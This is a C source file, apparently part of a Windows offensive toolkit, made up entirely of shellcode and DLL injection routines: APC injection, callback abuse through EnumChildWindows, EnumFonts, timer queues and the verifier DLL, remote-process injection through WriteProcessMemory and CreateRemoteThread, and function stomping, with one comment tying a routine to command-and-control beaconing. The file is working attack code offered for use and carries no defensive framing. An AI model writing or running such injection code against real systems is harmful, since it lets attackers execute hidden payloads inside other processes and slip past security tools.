#include "dllinjection.h"

BOOLEAN APCPayloadInjection
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress,
	IN	   SIZE_T sPayloadSize
)
{
	if (!sPayloadSize || !hThread || !pPayloadAddress) return FALSE;

	PVOID pLocalPayloadAddress = NULL;

	if (!(pLocalPayloadAddress= VirtualAlloc(0, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayloadAddress, pPayloadAddress, sPayloadSize)) return FALSE;

	DWORD dwOldProtections = 0;

	if (!VirtualProtect(pLocalPayloadAddress, sPayloadSize, PAGE_EXECUTE ,&dwOldProtections)) return FALSE;

	if (!QueueUserAPC((PAPCFUNC)pLocalPayloadAddress, hThread, 0)) {
		printf("[!] Injection Failed With ErrorCode: 0x%lx", GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumChildWindows
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID * pInjectedPayloadAddress
)
{
		if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

		PUCHAR pLocalPayload = NULL;

		if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

		if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

		if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

		if (!EnumChildWindows(NULL, (WNDENUMPROC)pLocalPayload, NULL)) return  FALSE;

		*pInjectedPayloadAddress = pLocalPayload;

		return TRUE;
}
BOOLEAN InjectCallbackPayloadEnumDesktops
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress,
	   OUT PHANDLE phMappedMemoryHandle 
)
{
	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

	PUCHAR pLocalPayload = NULL;
	if (!MapLocalMemory(pPayload, &pLocalPayload, sPayloadSize, phMappedMemoryHandle))return FALSE;
	
	EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)pLocalPayload, NULL);

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}


BOOLEAN InjectCallbackPayloadEnumFonts
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID * pInjectedPayloadAddress
)
{
	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

	PUCHAR pLocalPayload = NULL;

	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

	EnumFontsW( GetDC(NULL), NULL, (FONTENUMPROCW)pLocalPayload, NULL);

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumUILanguagesW
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID * pInjectedPayloadAddress
)
{
	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

	PUCHAR pLocalPayload = NULL;

	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)pLocalPayload, MUI_LANGUAGE_NAME, NULL)) return  FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumThreadWindows
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

	PUCHAR pLocalPayload = NULL;

	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

	if (!EnumThreadWindows(NULL, (WNDENUMPROC)pLocalPayload, NULL)) return  FALSE;

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}

BOOLEAN InjectCallbackPayloadTimer //Possible beacon function 4 C2
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PHANDLE phTimerHandle,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (!sPayloadSize || !phTimerHandle || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

	PUCHAR pLocalPayload = NULL;

	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

	if (!CreateTimerQueueTimer(
		phTimerHandle,
		0,
		(WAITORTIMERCALLBACK)pLocalPayload,
		NULL,
		NULL,
		NULL,
		NULL
	)) return  FALSE;
	
	return TRUE;
}

BOOLEAN InjectCallbackPayloadEnumDisplayMonitors
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;

	PUCHAR pLocalPayload = NULL;

	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)pLocalPayload, NULL);

	*pInjectedPayloadAddress = pLocalPayload;

	return TRUE;
}


BOOLEAN InjectCallbackPayloadVerEnumResource
(
	IN     LPVOID  pPayload,
	IN     DWORD   sPayloadSize,
	   OUT PDWORD  pdwOldProtections,
	   OUT PVOID  *pInjectedPayloadAddress
)
{
	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
	HMODULE hModule = { NULL };
	if (!(hModule = LoadLibraryA("verifier.dll")))return FALSE;

	
	PUCHAR pLocalPayload = NULL;

	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;

	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;

	fnVerifierEnumerateResource pVerifierEnumerateResource;

	if (!(pVerifierEnumerateResource = (fnVerifierEnumerateResource)GetProcAddress(hModule,(LPCSTR)"VerifierEnumerateResource")))return FALSE;

	if (!pVerifierEnumerateResource(
		GetCurrentProcess(),
		NULL,
		AvrfResourceHeapAllocation,
		(AVRF_RESOURCE_ENUMERATE_CALLBACK)pLocalPayload,
		NULL
	))return FALSE;

	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)pLocalPayload, MUI_LANGUAGE_NAME, NULL)) return  FALSE;

	return TRUE;
}

BOOLEAN InjectRemoteProcessShellcode
(
	IN     HANDLE hProcessHandle,
	IN     PUCHAR pShellcodeAddress,
	IN     SIZE_T sShellCodeSize,
	   OUT PVOID *ppExternalAddress
)
{
	SIZE_T  sBytesWritten;
	DWORD   dwOldProtections;

	if (!(*ppExternalAddress = VirtualAllocEx(
		hProcessHandle, 
		NULL, 
		sShellCodeSize, 
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	)))return FALSE;
	
	BOOLEAN bState = FALSE;

	if (!WriteProcessMemory(
		hProcessHandle, *ppExternalAddress, pShellcodeAddress,
		sShellCodeSize, &sBytesWritten
		))goto cleanup;

	if (sBytesWritten != sShellCodeSize)goto cleanup;

	if (!VirtualProtectEx(
		hProcessHandle, *ppExternalAddress, 
		sShellCodeSize, PAGE_EXECUTE, 
		&dwOldProtections)) goto cleanup;

	bState = TRUE;
	goto EndOfFunc;

cleanup:
	//VirtualFreeEx(hProcessHandle, *ppExternalAddress, sShellCodeSize, MEM_FREE);

EndOfFunc:
	return bState;
}


BOOL InjectDll(HANDLE hProcess, LPWSTR DllName)
{
	BOOL state = FALSE;
	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	
	SIZE_T BytesWritten;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	LPVOID pLoadLibraryW;
	LPVOID pAddress = NULL;
	
	if (!(pLoadLibraryW = GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW"))) goto _cleanup;
			 
	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto _cleanup;
	
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &BytesWritten)) goto _cleanup;
	
	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, 0, NULL)) == INVALID_HANDLE_VALUE) goto _cleanup;

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);

	state = TRUE;
_cleanup:
	if (pAddress) VirtualFree(pAddress, dwSizeToWrite, MEM_FREE);
	CloseHandle(hThread);
	return state;
}

BOOL InjectShellcode(HANDLE hProcess, PBYTE pLocalShellcode, SIZE_T sShellcode)
{
	PVOID  pExternalShellcode;
	DWORD  dwOldProtection;
	SIZE_T sBytesWritten;
	BOOL   state = FALSE;

	if (
		!(pExternalShellcode = VirtualAllocEx(hProcess,NULL,sShellcode,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
		) goto _cleanup;
	if (
		!WriteProcessMemory(hProcess, pExternalShellcode, pLocalShellcode, sShellcode, &sBytesWritten) || sShellcode != sBytesWritten
		) goto _cleanup;
	if (
		!VirtualProtectEx(hProcess, pExternalShellcode,sShellcode, PAGE_EXECUTE_READ, &dwOldProtection)
		) goto _cleanup;
	if (
		!CreateRemoteThread(hProcess, NULL, 0, pExternalShellcode, NULL, 0, NULL)
		) goto _cleanup;

	state = TRUE;

_cleanup:
	//if (pExternalShellcode) { 
		//RtlSecureZeroMemory(pExternalShellcode, sShellcode);
		//VirtualFree(pExternalShellcode, sShellcode, MEM_FREE); 
	//}
	
	return state;
}

BOOL StompFunction
(
	IN    PVOID  pTargetFuncAddress,
	IN	  PUCHAR pPayload,
	IN    SIZE_T sPayloadSize
)
{

	if (!pTargetFuncAddress || !pPayload || !sPayloadSize) return FALSE;

	DWORD dwOldProtections = 0;

	if (!VirtualProtect(pTargetFuncAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtections)) return FALSE;

	memcpy(pTargetFuncAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(pTargetFuncAddress, sPayloadSize, dwOldProtections, &dwOldProtections)) return FALSE;

	return TRUE;
}